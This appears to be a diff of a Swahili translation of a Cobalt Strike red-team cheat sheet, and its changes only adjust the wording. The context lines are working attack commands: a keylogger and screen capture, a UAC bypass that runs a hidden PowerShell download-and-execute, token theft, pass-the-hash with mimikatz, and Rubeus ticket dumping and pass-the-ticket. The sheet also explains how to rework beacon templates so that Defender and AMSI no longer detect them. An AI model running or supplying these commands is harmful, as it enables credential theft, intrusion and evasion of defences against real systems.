@@ -42,7 +42,7 @@ execute-assembly &#x3C;/path/to/executable.exe>
 # Screenshots
 printscreen    # Chukua picha moja kupitia njia ya PrintScr
 screenshot     # Chukua picha moja
-screenwatch    # Chukua picha za kawaida za desktop
+screenwatch    # Chukua picha za skrini za kawaida za desktop
 ## Nenda kwa View -> Screenshots kuziangalia
 
 # keylogger
@@ -73,7 +73,7 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 ## Steal token from pid
 ## Kama make_token lakini kuiba token kutoka kwa mchakato
 steal_token [pid] # Pia, hii ni muhimu kwa hatua za mtandao, si hatua za ndani
-## Kutoka kwa hati ya API tunajua kwamba aina hii ya kuingia "inaruhusu mwito kuiga token yake ya sasa". Hii ndiyo sababu matokeo ya Beacon yanasema Impersonated &#x3C;current_username> - inaimarisha token yetu iliyokopwa.
+## Kutoka kwa hati ya API tunajua kwamba aina hii ya kuingia "inaruhusu mwito kuiga token yake ya sasa". Hii ndiyo sababu matokeo ya Beacon yanasema Impersonated &#x3C;current_username> - inaimarisha token yetu iliyounganishwa.
 ls \\computer_name\c$ # Jaribu kutumia token iliyoundwa kufikia C$ katika kompyuta
 rev2self # Acha kutumia token kutoka steal_token
 
@@ -92,22 +92,22 @@ pth [DOMAIN\user] [NTLM hash]
 
 ## Pass the hash through mimikatz
 mimikatz sekurlsa::pth /user:&#x3C;username> /domain:&#x3C;DOMAIN> /ntlm:&#x3C;NTLM HASH> /run:"powershell -w hidden"
-## Bila /run, mimikatz inazalisha cmd.exe, ikiwa unakimbia kama mtumiaji mwenye Desktop, ataona shell (ikiwa unakimbia kama SYSTEM uko sawa)
-steal_token &#x3C;pid> #Kopa token kutoka kwa mchakato ulioanzishwa na mimikatz
+## Bila /run, mimikatz itazalisha cmd.exe, ikiwa unakimbia kama mtumiaji mwenye Desktop, ataona shell (ikiwa unakimbia kama SYSTEM uko sawa)
+steal_token &#x3C;pid> #Iba token kutoka kwa mchakato ulioanzishwa na mimikatz
 
 ## Pass the ticket
 ## Omba tiketi
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;username> /domain:&#x3C;domain> /aes256:&#x3C;aes_keys> /nowrap /opsec
 ## Unda kikao kipya cha kuingia ili kutumia tiketi mpya (ili usifute ile iliyovunjika)
 make_token &#x3C;domain>\&#x3C;username> DummyPass
-## Andika tiketi katika mashine ya mshambuliaji kutoka kwa kikao cha poweshell &#x26; ipakue
+## Andika tiketi kwenye mashine ya mshambuliaji kutoka kwa kikao cha poweshell &#x26; pakua
 [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
 kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi
 
 ## Pass the ticket from SYSTEM
 ## Unda mchakato mpya na tiketi
 execute-assembly C:\path\Rubeus.exe asktgt /user:&#x3C;USERNAME> /domain:&#x3C;DOMAIN> /aes256:&#x3C;AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
-## Kopa token kutoka kwa mchakato huo
+## Iba token kutoka kwa mchakato huo
 steal_token &#x3C;pid>
 
 ## Extract ticket + Pass the ticket
@@ -119,7 +119,7 @@ execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:&#x3C;luid> /nowr
 execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
 ### Insert ticket in generate logon session
 execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
-### Hatimaye, kopa token kutoka kwa mchakato huo mpya
+### Hatimaye, iba token kutoka kwa mchakato huo mpya
 steal_token &#x3C;pid>
 
 # Lateral Movement
@@ -182,9 +182,9 @@ beacon> ssh 10.10.17.12:22 username password</code></pre>
 
 Kawaida katika `/opt/cobaltstrike/artifact-kit` unaweza kupata msimbo na templeti zilizotengenezwa awali (katika `/src-common`) za payloads ambazo cobalt strike itatumia kuzalisha beacons za binary.
 
-Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na backdoor iliyozalishwa (au tu na templeti iliyotengenezwa) unaweza kupata kile kinachosababisha mlinzi kuanzisha. Kawaida ni mfuatano. Hivyo unaweza tu kubadilisha msimbo unaozalisha backdoor ili mfuatano huo usionekane katika binary ya mwisho.
+Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na backdoor iliyozalishwa (au tu na templeti iliyokusanywa) unaweza kupata kile kinachofanya defender kuanzisha. Kawaida ni mfuatano. Kwa hivyo unaweza tu kubadilisha msimbo unaozalisha backdoor ili mfuatano huo usionekane katika binary ya mwisho.
 
-Baada ya kubadilisha msimbo, kimbia `./build.sh` kutoka kwenye saraka hiyo hiyo na nakili folda ya `dist-pipe/` ndani ya mteja wa Windows katika `C:\Tools\cobaltstrike\ArtifactKit`.
+Baada ya kubadilisha msimbo, kimbia tu `./build.sh` kutoka kwenye saraka hiyo hiyo na nakili folda ya `dist-pipe/` ndani ya mteja wa Windows katika `C:\Tools\cobaltstrike\ArtifactKit`.
 ```
 pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
 ```
@@ -198,9 +198,9 @@ Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na 
 ```
 .\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
 ```
-Kubadilisha mistari iliyogunduliwa kunaweza kuunda kiolezo ambacho hakiwezi kugundulika.
+Kubadilisha mistari iliyogunduliwa kunaweza kuunda kiolezo ambacho hakiwezi kukamatwa.
 
-Usisahau kupakia skripti ya nguvu `ResourceKit\resources.cna` kuonyesha Cobalt Strike kutumia rasilimali kutoka diski ambazo tunataka na si zile zilizopakiwa.
+Usisahau kupakia skripti ya nguvu `ResourceKit\resources.cna` kuonyesha Cobalt Strike kutumia rasilimali kutoka kwa diski ambazo tunataka na si zile zilizopakiwa.
 ```bash
 cd C:\Tools\neo4j\bin
 neo4j.bat console
